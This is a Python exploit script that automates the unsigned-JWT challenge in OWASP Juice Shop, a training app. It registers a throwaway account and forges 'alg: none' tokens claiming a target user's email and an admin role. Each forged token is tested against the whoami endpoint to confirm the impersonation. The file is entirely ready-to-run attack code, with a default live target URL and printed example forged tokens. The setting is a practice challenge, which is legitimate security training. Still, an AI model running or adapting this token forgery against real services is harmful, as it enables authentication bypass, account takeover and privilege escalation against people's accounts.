#!/usr/bin/env python3
"""
Unsigned JWT Challenge Solver
=============================
Automated exploitation of JWT algorithm confusion vulnerabilities in Juice Shop.

Target: Juice Shop instance
Challenge: Forge unsigned JWT for jwtn3d@juice-sh.op

Usage:
    python3 unsigned_jwt_solver.py
"""

import requests
import json
import base64
import time
import sys
from urllib.parse import urljoin

# ============================================================================
# CONFIGURATION - Change these values for your Juice Shop instance
# ============================================================================

# Change this URL to your Juice Shop instance
JUICE_SHOP_URL = "https://juice5.wonkatech.org"  # <-- CHANGE THIS

# Target user to impersonate
TARGET_EMAIL = "jwtn3d@juice-sh.op"

# JWT algorithms to try
ALGORITHMS_TO_TRY = ["none", "None", "NONE", ""]

# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class UnsignedJWTSolver:
    """Unsigned JWT Challenge solver"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        self.original_token = None
        self.forged_token = None

    def print_banner(self):
        """Print challenge banner"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}  UNSIGNED JWT CHALLENGE SOLVER{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}\n")
        print(f"{Colors.CYAN}Target: {Colors.BOLD}{self.base_url}{Colors.ENDC}")
        print(f"{Colors.CYAN}Objective: Forge unsigned JWT for {TARGET_EMAIL}{Colors.ENDC}\n")

    def get_legitimate_token(self):
        """Get a legitimate JWT token by registering and logging in"""
        print(f"{Colors.CYAN}🔑 Obtaining legitimate JWT token...{Colors.ENDC}")

        # Generate unique credentials
        timestamp = str(int(time.time()))
        email = f"jwttest{timestamp}@test.com"
        password = f"Test123!{timestamp}"

        # Register user
        register_data = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
            "securityAnswer": "test"
        }

        try:
            register_url = urljoin(self.base_url, '/api/Users/')
            register_response = self.session.post(register_url, json=register_data)
        except:
            pass  # Registration might fail if user exists

        # Login
        login_data = {"email": email, "password": password}
        login_url = urljoin(self.base_url, '/rest/user/login')

        try:
            login_response = self.session.post(login_url, json=login_data)

            if login_response.status_code == 200:
                result = login_response.json()
                self.original_token = result.get('authentication', {}).get('token')

                if self.original_token:
                    print(f"{Colors.GREEN}✅ Obtained legitimate token{Colors.ENDC}")
                    self.analyze_token_structure(self.original_token)
                    return True

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to obtain token: {e}{Colors.ENDC}")

        return False

    def analyze_token_structure(self, token):
        """Analyze the structure of a legitimate JWT token"""
        print(f"{Colors.CYAN}🔍 Analyzing JWT structure...{Colors.ENDC}")

        try:
            # Split JWT into parts
            parts = token.split('.')
            if len(parts) != 3:
                print(f"{Colors.RED}❌ Invalid JWT format{Colors.ENDC}")
                return

            header_encoded, payload_encoded, signature = parts

            # Decode header
            header_padding = 4 - len(header_encoded) % 4
            if header_padding != 4:
                header_encoded += '=' * header_padding

            header_decoded = base64.b64decode(header_encoded).decode('utf-8')
            header_json = json.loads(header_decoded)

            # Decode payload
            payload_padding = 4 - len(payload_encoded) % 4
            if payload_padding != 4:
                payload_encoded += '=' * payload_padding

            payload_decoded = base64.b64decode(payload_encoded).decode('utf-8')
            payload_json = json.loads(payload_decoded)

            print(f"   {Colors.GREEN}Header:{Colors.ENDC}")
            print(f"   {json.dumps(header_json, indent=6)}")
            print(f"   {Colors.GREEN}Payload:{Colors.ENDC}")
            print(f"   {json.dumps(payload_json, indent=6)}")
            print(f"   {Colors.GREEN}Signature Length:{Colors.ENDC} {len(signature)} characters")

            return header_json, payload_json

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to analyze token: {e}{Colors.ENDC}")
            return None, None

    def create_unsigned_jwt(self, algorithm="none"):
        """Create an unsigned JWT for the target user"""
        print(f"{Colors.CYAN}🔧 Forging unsigned JWT with algorithm: {algorithm}{Colors.ENDC}")

        # Create header with no algorithm
        header = {
            "alg": algorithm,
            "typ": "JWT"
        }

        # Create payload for target user
        current_time = int(time.time())
        payload = {
            "userId": 0,  # Try user ID 0 or other values
            "email": TARGET_EMAIL,
            "role": "admin",  # Try to escalate privileges
            "iat": current_time,
            "exp": current_time + (24 * 60 * 60)  # 24 hours from now
        }

        # Encode parts
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        # Create unsigned token (note the trailing dot with no signature)
        unsigned_token = f"{header_encoded}.{payload_encoded}."

        print(f"   {Colors.GREEN}Forged Token:{Colors.ENDC}")
        print(f"   {unsigned_token[:60]}...{unsigned_token[-20:]}")

        return unsigned_token

    def test_forged_token(self, token):
        """Test if the forged JWT token is accepted"""
        print(f"{Colors.CYAN}🧪 Testing forged JWT token...{Colors.ENDC}")

        # Test with whoami endpoint
        whoami_url = urljoin(self.base_url, '/rest/user/whoami')

        try:
            headers = {'Authorization': f'Bearer {token}'}
            response = self.session.get(whoami_url, headers=headers)

            if response.status_code == 200:
                result = response.json()
                user_data = result.get('user', {})

                if user_data.get('email') == TARGET_EMAIL:
                    print(f"{Colors.GREEN}✅ SUCCESS! Forged JWT accepted!{Colors.ENDC}")
                    print(f"   {Colors.GREEN}User ID:{Colors.ENDC} {user_data.get('id')}")
                    print(f"   {Colors.GREEN}Email:{Colors.ENDC} {user_data.get('email')}")
                    print(f"   {Colors.GREEN}Role:{Colors.ENDC} {user_data.get('role', 'N/A')}")
                    return True
                else:
                    print(f"{Colors.YELLOW}⚠️  Token accepted but for different user: {user_data.get('email')}{Colors.ENDC}")
            else:
                print(f"   {Colors.RED}❌ Token rejected (HTTP {response.status_code}){Colors.ENDC}")

        except Exception as e:
            print(f"   {Colors.RED}❌ Test failed: {e}{Colors.ENDC}")

        return False

    def solve_challenge(self):
        """Main method to solve the unsigned JWT challenge"""
        self.print_banner()

        # Step 1: Get legitimate token for analysis
        if not self.get_legitimate_token():
            print(f"{Colors.RED}❌ Failed to obtain legitimate JWT token{Colors.ENDC}")
            return False

        # Step 2: Try different unsigned JWT variations
        print(f"\n{Colors.CYAN}🔄 Attempting JWT forgery with different algorithms...{Colors.ENDC}")

        for algorithm in ALGORITHMS_TO_TRY:
            print(f"\n{Colors.YELLOW}🔧 Trying algorithm: '{algorithm}'{Colors.ENDC}")

            # Create forged token
            forged_token = self.create_unsigned_jwt(algorithm)

            # Test the forged token
            if self.test_forged_token(forged_token):
                self.forged_token = forged_token

                print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 UNSIGNED JWT CHALLENGE COMPLETED!{Colors.ENDC}")
                print(f"{Colors.GREEN}Successfully impersonated: {TARGET_EMAIL}{Colors.ENDC}")

                return True

        print(f"\n{Colors.RED}❌ Challenge not completed automatically{Colors.ENDC}")
        print(f"{Colors.YELLOW}The application might have additional protections{Colors.ENDC}")

        return False


def main():
    """Main entry point"""
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        # Use default URL - CHANGE THIS FOR YOUR INSTANCE
        base_url = JUICE_SHOP_URL

    print(f"{Colors.YELLOW}🎯 Starting Unsigned JWT Challenge{Colors.ENDC}")
    print(f"{Colors.YELLOW}Target: {base_url}{Colors.ENDC}")

    solver = UnsignedJWTSolver(base_url)
    success = solver.solve_challenge()

    if not success:
        print(f"\n{Colors.CYAN}💡 Manual alternatives:{Colors.ENDC}")
        print(f"1. Use jwt.io to manually create unsigned token")
        print(f"2. Try different user IDs (0, -1, 999)")
        print(f"3. Test various algorithm values ('none', '', null)")
        print(f"4. Check if application validates JWT signatures at all")

        # Show example forged token
        example_header = '{"alg":"none","typ":"JWT"}'
        example_payload = f'{{"email":"{TARGET_EMAIL}","role":"admin","iat":{int(time.time())},"exp":{int(time.time()) + 86400}}}'

        header_b64 = base64.urlsafe_b64encode(example_header.encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(example_payload.encode()).decode().rstrip('=')
        example_token = f"{header_b64}.{payload_b64}."

        print(f"\n{Colors.CYAN}🔧 Example forged token:{Colors.ENDC}")
        print(f"{example_token}")

if __name__ == '__main__':
    main()